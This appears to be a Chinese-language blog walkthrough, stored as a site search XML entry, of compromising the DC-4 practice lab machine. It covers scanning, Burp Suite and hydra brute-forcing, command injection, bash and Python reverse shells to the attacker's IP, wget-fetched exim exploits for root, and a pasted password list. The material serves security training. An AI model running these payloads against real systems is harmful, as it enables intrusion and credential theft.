<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DC-4</title>
    <link href="/2024/07/24/DC-4/"/>
    <url>/2024/07/24/DC-4/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>通过开关目标靶机来确认目标靶机的IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN  192.168.204.0/24<br></code></pre></td></tr></table></figure><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704224901788.png" alt="image-20240704224901788"></p><p>开靶机后：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704224934605.png" alt="image-20240704224934605"></p><p>对比之下可以得到目标靶机的IP地址为：<code>192.168.204.133</code>。</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="扫描开放的TCP端口"><a href="#扫描开放的TCP端口" class="headerlink" title="扫描开放的TCP端口"></a>扫描开放的TCP端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.133<br>nmap -sT -p- 192.168.204.133<br></code></pre></td></tr></table></figure><p><code>-sN</code>：表示执行Null扫描，Null扫描是一种TCP扫描技术。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704225650473.png" alt="image-20240704225650473"></p><p>扫描结果显示，开放的端口为<code>22</code>端口和<code>80</code>端口。</p><h3 id="扫描开放的UDP端口"><a href="#扫描开放的UDP端口" class="headerlink" title="扫描开放的UDP端口"></a>扫描开放的UDP端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sU -top-ports 20 -p- 192.168.204.133<br></code></pre></td></tr></table></figure><p><code>-sU</code>：表示执行UDP扫描，UDP不建立连接，所以端口扫描和响应的处理方式不同。</p><p><code>-top-ports</code>：指定扫描的端口数量，该参数后面跟一个数字。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704230408447.png" alt="image-20240704230408447"></p><p>根据<code>STATE</code>字段，我们发现还是有蛮多开放的UDP端口的，但是一般不对UDP端口进行测试，其优先级靠后。</p><h2 id="端口详细信息扫描（tcp）"><a href="#端口详细信息扫描（tcp）" class="headerlink" title="端口详细信息扫描（tcp）"></a>端口详细信息扫描（tcp）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80 192.168.204.133<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704231641121.png" alt="image-20240704231641121"></p><p>根据扫描结果，可以得知：</p><blockquote><p>22端口开放的是ssh服务，运行版本为OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)，其中还给出了ssh主机密钥。提示可以进行ssh远程连接。</p><p>80端口开放的是http服务，运行版本是nginx 1.15.10。</p></blockquote><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80 192.168.204.133<br></code></pre></td></tr></table></figure><p>这次nmap漏扫的响应时间比较长，得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705134104640.png" alt="image-20240705134104640"></p><p>根据结果可知，80端口http服务可能存在着<code>csrf（跨站请求伪造）</code>漏洞。路径为：</p><blockquote><p> <a href="http://192.168.204.133/">http://192.168.204.133:80/</a></p><p> <a href="http://192.168.204.133/login.php">http://192.168.204.133:80/login.php</a></p></blockquote><p>通过网站浏览可以发现这两个网址打开都是相同的登陆界面。为了便于后续漏洞利用，比如植入一句话木马之类的，我们后续均使用<code>http://192.168.204.133:80/login.php</code></p><h2 id="网页信息收集"><a href="#网页信息收集" class="headerlink" title="网页信息收集"></a>网页信息收集</h2><p>访问链接：<code>http://192.168.204.133:80/login.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705134633165.png" alt="image-20240705134633165"></p><p>直接就是一个管理信息系统登陆界面。</p><p>使用Wappalyzer查看网页的技术构成：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705134758802.png" alt="image-20240705134758802"></p><p>没有得到有关网页框架等相关信息，即，没啥有用信息。</p><p>既然是登陆界面,自然就要想方设法获取合法的管理员登陆账号。可以先做目录爆破看看能否得到一些有用的资源信息。</p><h3 id="gubuster目录爆破"><a href="#gubuster目录爆破" class="headerlink" title="gubuster目录爆破"></a>gubuster目录爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.133 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705135323268.png" alt="image-20240705135323268"></p><p>似乎没有得到什么有用的信息,访问爆破得到的两个网址:</p><blockquote><p><a href="http://192.168.204.133/images/">http://192.168.204.133/images/</a></p><p><a href="http://192.168.204.133/css/">http://192.168.204.133/css/</a></p></blockquote><p>两个网页的访问响应都是<code>403 Forbidden</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705135444738.png" alt="image-20240705135444738"></p><blockquote><p><code>403 Forbidden</code>:是指在尝试访问网站或特定页面时,服务器拒绝了请求。发生该问题通常是由于以下原因造成的：权限不足、IP地址限制、访问控制列表（ACL）限制、http身份验证失败、目录列表拒绝、内容过滤或防火墙规则。</p></blockquote><p>所以这次目录爆破等于无效爆破，爆破出来的目录访问是被服务器拒绝的。</p><p>目前为止,捋一下思绪。我们通过nmap漏扫发现了网站可能存在<code>csrf漏洞</code>，然后我们通过目录爆破出来的网址链接，访问均被服务器拒绝。通过Wappalyzer分析网页的技术构成，也没有得到有关于网页框架等有用的信息。</p><p>所以,接下来,我们就要以目标网站的csrf漏洞为切入点。</p><h3 id="访问存在csrf漏洞的登陆网页"><a href="#访问存在csrf漏洞的登陆网页" class="headerlink" title="访问存在csrf漏洞的登陆网页"></a>访问存在csrf漏洞的登陆网页</h3><p>使用burpsuite进行抓包检查登陆界面上用户名和密码的传输方式。</p><p>在登陆界面随机输入一些用户名和密码，然后点击“Submit”：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705210622750.png" alt="image-20240705210622750"></p><p>查看burpsuite拦截到的数据包：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705210734505.png" alt="image-20240705210734505"></p><p>得到的信息有：</p><blockquote><p>请求方式为POST，传输方式是明文：username&#x3D;chfhj&amp;password&#x3D;hkjhk</p></blockquote><h3 id="burpsuite爆破"><a href="#burpsuite爆破" class="headerlink" title="burpsuite爆破"></a>burpsuite爆破</h3><p>已知账号密码传输的方式以及明文传输格式，因此可以通过抓包进行账号密码的爆破。仅设置<code>username</code>和<code>password</code>两个payload集合，然后通过用户名字典和密码字典进行爆破。(<a href="http://192.168.204.133/login.php">http://192.168.204.133:80/login.php</a>)</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705212615851.png" alt="image-20240705212615851"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705213405067.png" alt="image-20240705213405067"></p><p>之后就是设置<code>payload</code>。注意，在前面<code>positions</code>选中了多少个爆破变量位置，后面就要设置多少个<code>payload</code>，set下的数字代表的是position 参数编号。需要按序分别选择然后导入爆破字典。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223514917.png" alt="image-20240706223514917"></p><p>设置完<code>payload</code>之后就可以点击右上角的<code>start attack</code>开始进行攻击。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706222807477.png" alt="image-20240706222807477"></p><p>爆破完后（当然也可以是在爆破之前）进行过滤设置。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223951881.png" alt="image-20240706223951881"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706224012970.png" alt="image-20240706224012970"></p><p>设置只显示状态码为2xx系列成功的数据包。</p><p>爆破（花了很长时间）得到用户名和密码：</p><blockquote><p>username：admin     password：happy</p></blockquote><p>但是爆破结果不仅得到了上面的账号和密码，还有其它的爆破成功的用户名密码对：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223251316.png" alt="image-20240706223251316"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223327065.png" alt="image-20240706223327065"></p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>使用上述爆破得到的账号密码进行登陆。登陆后的界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706095837540.png" alt="image-20240706095837540"></p><p>点击“Command”得到如下界面：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706095909244.png" alt="image-20240706095909244"></p><p>点击“Run”：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706095954196.png" alt="image-20240706095954196"></p><p>有提示信息：<code>You have selected: ls -l</code>，似乎在指示，我们通过前端执行了命令<code> ls -l</code>。尝试抓包看看是否能够更改这条指令。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706134153866.png" alt="image-20240706134153866"></p><p>可以看到的是，抓取的包以明文的形式显示出了<code>ls -l</code>指令，即<code>ls+-l</code>。尝试修改该指令并进行重放。将其修改为<code>cat index.php</code>即,<code>cat+index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706134704114.png" alt="image-20240706134704114"></p><p>然后进行放行! </p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706134737052.png" alt="image-20240706134737052"></p><p>ok!成功地执行了我们修改的命令。so！我们就可以通过命令来反弹shell了。</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><ul><li><p>实践gpt上面的反弹shell操作方案</p><p>首先需要现在攻击机进行端口监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -nvlp 9999<br>/bin/bash -i &gt;&amp; /dev/tcp/192.168.204.128/9999 0&gt;&amp;1<br>burpsuite编码：<br>/bin/bash%20-i%20%3E%26%20/dev/tcp/192.168.204.128/9999%200%3E%261<br></code></pre></td></tr></table></figure><p>这里的IP地址是攻击机（kali）的IP地址。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706142153965.png" alt="image-20240706142153965"></p><p>好！失败。。。</p><ul><li>编写脚本进行命令注入，进而实现反弹shell</li></ul><p>首先编写反弹脚本：</p><p>设置监听目标IP以及监听端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">import socket,subprocess,os;<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect((&quot;<span class="hljs-number">192.168</span>.<span class="hljs-number">204.128</span>&quot;,<span class="hljs-number">9999</span>));<br>os.dup2(s.fileno(),0);<br>os.dup2(s.fileno(),1); <br>os.dup2(s.fileno(),2);<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<br></code></pre></td></tr></table></figure><p>然后直接在终端命令行执行脚本代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.204.128&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><br>python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%<span class="hljs-number">22192.168</span>.<span class="hljs-number">204.128</span>%<span class="hljs-number">22</span>,<span class="hljs-number">9999</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706151934510.png" alt="image-20240706151934510"></p><p>然后放行。反弹成功，获取目标靶机合法用户的登陆权限。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706152723101.png" alt="image-20240706152723101"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看当前具有SUID权限的命令;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706155330709.png" alt="image-20240706155330709"></p><p>其中，可以尝试的提权命令有：</p><blockquote><p>passwd、exim4、mount、su</p></blockquote><p>首先先切换到对方用户登陆的模式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>逐一尝试这些可能被提权的命令：</p><blockquote><p><code>passwd</code>：passwd root</p><p><code>mount</code>：mount –o bind &#x2F;bin&#x2F;bash &#x2F;usr&#x2F;bin&#x2F;mount</p><p><code>su</code>：su</p><p><code>exim4</code>：</p></blockquote><p>提示无法修改root用户的密码，表明没有root权限，没提权成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706221743698.png" alt="image-20240706221743698"></p><p>提示只有root用户能够使用 <code>--options</code>，表明当前没有提权成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706222057830.png" alt="image-20240706222057830"></p><p>提示需要输入密码，后台管理系统的登陆账户密码也不管用。很难通过尝试进行提权。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706222458733.png" alt="image-20240706222458733"></p><p>最后是exim4，它的提权难度较大。</p><p>首先先查看exim4的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exim4 --version<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706224633919.png" alt="image-20240706224633919"></p><blockquote><p>exim4：4.89</p></blockquote><p>明确使用exim4进行提权后，使用<code>searchsploit</code>查询可用于提权的代码文件。</p><p>注意！正常来说，命令应该是exim，不是exim4哦！这么输入会报错的。</p><p>exim4：exim指令的version4。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706225050928.png" alt="image-20240706225050928"></p><p>搜索得到的结果不少哦！一般文件后缀为txt文件的比较容易实现。但是这些实现都需要自己手动按照其指示的方法实现。</p><blockquote><p>linux&#x2F;remote&#x2F;25297.txt</p><p>linux&#x2F;remote&#x2F;46974.txt</p><p>multiple&#x2F;dos&#x2F;43184.txt</p><p>linux&#x2F;local&#x2F;39549.txt</p><p>linux&#x2F;dos&#x2F;23896.txt</p></blockquote><p>仔细一看，我们发现其中有<code>.sh</code>后缀的文件，这些文件一般为shell脚本文件。通过运行命令就可以进行利用的，会比手动实现方法相对节省时间。</p><blockquote><p>linux&#x2F;local&#x2F;796.sh</p><p>linux&#x2F;local&#x2F;39535.sh</p><p>linux&#x2F;local&#x2F;46996.sh</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706225933071.png" alt="image-20240706225933071"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -m 796.sh<br>searchsploit -m 39535.sh<br>searchsploit -m 46996.sh<br></code></pre></td></tr></table></figure><p>将这三个.sh文件均下载到当前目录下。</p><p>然后将脚本部署到服务器中，并让目标靶机通过<code>wget</code>命令下载该提权脚本进行执行（以目标靶机合法用户的身份以及交互界面下载）。</p><p>当前kali与目标靶机位于同一网段。所以可以在本机（kali）部署<code>apache2</code>服务让目标靶机下载即可。</p><p>首先在本机（kali）启动apache2服务，然后将下载的shell脚本文件复制到 <code>/var/www/html/</code>文件夹下，相当于放到网页上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">service apache2 start<br><span class="hljs-built_in">cp</span> 796.sh /var/www/html/<br>service apache2 status  //查看状态<br><br><span class="hljs-built_in">cp</span> 39535.sh /var/www/html/<br><span class="hljs-built_in">cp</span> 46996.sh /var/www/html/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706232255198.png" alt="image-20240706232255198"></p><p>为了防止某一个脚本提权失败，我们把其它的脚本也复制上去。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706233427682.png" alt="image-20240706233427682"></p><p>然后到目标靶机（目标靶机用户交互界面处），执行下载操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.204.128/796.sh<br>wget http://192.168.204.128/39535.sh<br>wget http://192.168.204.128/46996.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706232619485.png" alt="image-20240706232619485"></p><p>由于权限不够，所以下载操作被拒绝了，无法在当前目录进行写入。</p><blockquote><p>一般情况下，<code>tmp</code>目录都具有相当高的权限。</p></blockquote><p>因此，可以尝试切换到<code>/tmp</code>目录下进行提权脚本的下载。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706232913257.png" alt="image-20240706232913257"></p><p>下载成功。把三个都给下载了：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234051092.png" alt="image-20240706234051092"></p><p>然后为下载的脚本加上可执行权限，并执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x 796.sh<br>./796.sh<br><br><span class="hljs-built_in">chmod</span> +x 39535.sh<br>./39535.sh<br><br><span class="hljs-built_in">chmod</span> +x 46996.sh<br>./46996.sh<br></code></pre></td></tr></table></figure><ul><li>.&#x2F;796.sh：发生gcc错误，提权失败。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706233248963.png" alt="image-20240706233248963"></p><ul><li>39535.sh：没有找到exim命令，提权失败。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234322456.png" alt="image-20240706234322456"></p><ul><li>46996.sh：提权成功。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234350082.png" alt="image-20240706234350082"></p><p>查找flag文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234829075.png" alt="image-20240706234829075"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234846253.png" alt="image-20240706234846253"></p><p>至此，所有工作完成。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次是通过burpsuite进行用户名和密码爆破，然后通过shell注入、反弹shell以及命令提权获取最后的flag。</p><p>但是在之前进行Getshell的时候我们还使用到了ssh远程连接。</p><p>所以对于这个靶场，也可以尝试进行ssh爆破（hydra）。</p><blockquote><p>一般在<code>/home</code>目录下能够找到其他用户的文件夹或者更多信息，也能够从各个文件夹中找到更多信息。</p></blockquote><p>在提权成功后，在<code>/home</code>目录下的jim-backups文件夹中，发现了一个名为<code>old-passwords.bak</code>的文件。</p><p>注意！home目录下的三个文件夹看着很像用户的文件夹。所以在后续进行爆破的时候，用户名字典就从这三个文件夹名入手。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706235128164.png" alt="image-20240706235128164"></p><blockquote><p>.bak后缀的文件通常是备份文件。用于存储数据的副本，以防止原始文件意外丢失或损坏。</p></blockquote><p>查看其具体内容,可以猜测是一个密码字典。对其进行复制保存，也许以后爆破的时候会用上。</p><blockquote><p>000000<br>12345<br>iloveyou<br>1q2w3e4r5t<br>1234<br>123456a<br>qwertyuiop<br>monkey<br>123321<br>dragon<br>654321<br>666666<br>123<br>myspace1<br>a123456<br>121212<br>1qaz2wsx<br>123qwe<br>123abc<br>tinkle<br>target123<br>gwerty<br>1g2w3e4r<br>gwerty123<br>zag12wsx<br>7777777<br>qwerty1<br>1q2w3e4r<br>987654321<br>222222<br>qwe123<br>qwerty123<br>zxcvbnm<br>555555<br>112233<br>fuckyou<br>asdfghjkl<br>12345a<br>123123123<br>1q2w3e<br>qazwsx<br>loveme1<br>juventus<br>jennifer1<br>!~!1<br>bubbles<br>samuel<br>fuckoff<br>lovers<br>cheese1<br>0123456<br>123asd<br>999999999<br>madison<br>elizabeth1<br>music<br>buster1<br>lauren<br>david1<br>tigger1<br>123qweasd<br>taylor1<br>carlos<br>tinkerbell<br>samantha1<br>Sojdlg123aljg<br>joshua1<br>poop<br>stella<br>myspace123<br>asdasd5<br>freedom1<br>whatever1<br>xxxxxx<br>00000<br>valentina<br>a1b2c3<br>741852963<br>austin<br>monica<br>qaz123<br>lovely1<br>music1<br>harley1<br>family1<br>spongebob1<br>steven<br>nirvana<br>1234abcd<br>hellokitty<br>thomas1<br>cooper<br>520520<br>muffin<br>christian1<br>love13<br>fucku2<br>arsenal1<br>lucky7<br>diablo<br>apples<br>george1<br>babyboy1<br>crystal<br>1122334455<br>player1<br>aa123456<br>vfhbyf<br>forever1<br>Password<br>winston<br>chivas1<br>sexy<br>hockey1<br>1a2b3c4d<br>pussy<br>playboy1<br>stalker<br>cherry<br>tweety<br>toyota<br>creative<br>gemini<br>pretty1<br>maverick<br>brittany1<br>nathan1<br>letmein1<br>cameron1<br>secret1<br>google1<br>heaven<br>martina<br>murphy<br>spongebob<br>uQA9Ebw445<br>fernando<br>pretty<br>startfinding<br>softball<br>dolphin1<br>fuckme<br>test123<br>qwerty1234<br>kobe24<br>alejandro<br>adrian<br>september<br>aaaaaa1<br>bubba1<br>isabella<br>abc123456<br>password3<br>jason1<br>abcdefg123<br>loveyou1<br>shannon<br>100200<br>manuel<br>leonardo<br>molly1<br>flowers<br>123456z<br>007007<br>password.<br>321321<br>miguel<br>samsung1<br>sergey<br>sweet1<br>abc1234<br>windows<br>qwert123<br>vfrcbv<br>poohbear<br>d123456<br>school1<br>badboy<br>951753<br>123456c<br>111<br>steven1<br>snoopy1<br>garfield<br>YAgjecc826<br>compaq<br>candy1<br>sarah1<br>qwerty123456<br>123456l<br>eminem1<br>141414<br>789789<br>maria<br>steelers<br>iloveme1<br>morgan1<br>winner<br>boomer<br>lolita<br>nastya<br>alexis1<br>carmen<br>angelo<br>nicholas1<br>portugal<br>precious<br>jackass1<br>jonathan1<br>yfnfif<br>bitch<br>tiffany<br>rabbit<br>rainbow1<br>angel123<br>popcorn<br>barbara<br>brandy<br>starwars1<br>barney<br>natalia<br>jibril04<br>hiphop<br>tiffany1<br>shorty<br>poohbear1<br>simone<br>albert<br>marlboro<br>hardcore<br>cowboys<br>sydney<br>alex<br>scorpio<br>1234512345<br>q12345<br>qq123456<br>onelove<br>bond007<br>abcdefg1<br>eagles<br>crystal1<br>azertyuiop<br>winter<br>sexy12<br>angelina<br>james<br>svetlana<br>fatima<br>123456k<br>icecream<br>popcorn1</p></blockquote><p>kali默认密码字典：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p>pay：如果之前没有进入到目标目录对默认字典文件进行解压的话，是会报错的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gunzip rockyou.txt.gz<br></code></pre></td></tr></table></figure><h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>使用默认密码字典进行爆破的话所需的时间 太长了，而且也有爆破失败的风险</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L usersname.txt -P passworddicDC4.txt ssh://192.168.204.133<br></code></pre></td></tr></table></figure><p>其中：</p><p><code>passworddicDC4.txt</code>是上述从jim文件夹中获取到的密码备份文件。</p><p><code>usersname.txt</code>中包含在目标靶机home目录下的疑似用户文件夹的三个用户名。</p><p>ok！很快就爆破出了一个合法的SSH账户：</p><blockquote><p>host: 192.168.204.133 </p><p>login: jim </p><p>password: jibril04</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715131345123.png" alt="image-20240715131345123"></p><h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><blockquote><p>host: 192.168.204.133 </p><p>login: jim </p><p>password: jibril04</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh jim@192.168.204.133<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715131622681.png" alt="image-20240715131622681"></p><p>ok！成功远程登陆了jim账户。</p><h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>使用<code>sudo -l</code>显示出当前登陆用户的权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715131837232.png" alt="image-20240715131837232"></p><p>由上述执行结果可知，需要输入jim用户的sudo账户密码，但是我们不知道。</p><p>接着我们查看jim用户所在系统中具有SUID权限的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132113057.png" alt="image-20240715132113057"></p><p>这其中，可以尝试的提权指令有：exim4、mount、su、passwd。但是经过上述的经验，最终能成功进行提权的命令只有exim4，但是它的提权过程比较复杂。</p><p>所以我们可以尝试获取其它信息并择出其中有用的信息进行提权。</p><p>使用<code>ls</code>指令查看当前用户的目录列表：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132521386.png" 